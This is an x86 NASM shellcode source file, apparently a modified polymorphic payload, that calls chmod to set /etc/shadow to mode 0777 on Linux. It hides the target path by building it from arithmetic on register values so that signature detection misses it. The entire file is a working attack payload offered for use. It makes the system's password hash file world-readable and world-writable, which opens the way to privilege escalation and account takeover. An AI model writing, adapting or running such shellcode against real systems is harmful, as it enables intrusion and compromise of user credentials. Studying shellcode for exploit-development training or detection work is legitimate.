; MODIFIED SHELLCODE
; Filename: chmodshadow-poly.nasm
; Author: Jeremy Catelain
; chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes

section .text
global _start

_start: 
mov ebx, eax
xor eax, ebx
push dword eax
mov esi, 0x6374ef32 
add esi, 0x13FA752F ;0x776F6461
mov dword [esp-4], esi
sub esi, 0xefc3532
mov dword [esp-8], esi ; 0x68732f2f
mov dword [esp-12], 0x6374652f
sub esp, 12
mov    ebx,esp
push word  0x1ff
pop    cx
mov    al,0xf
int    0x80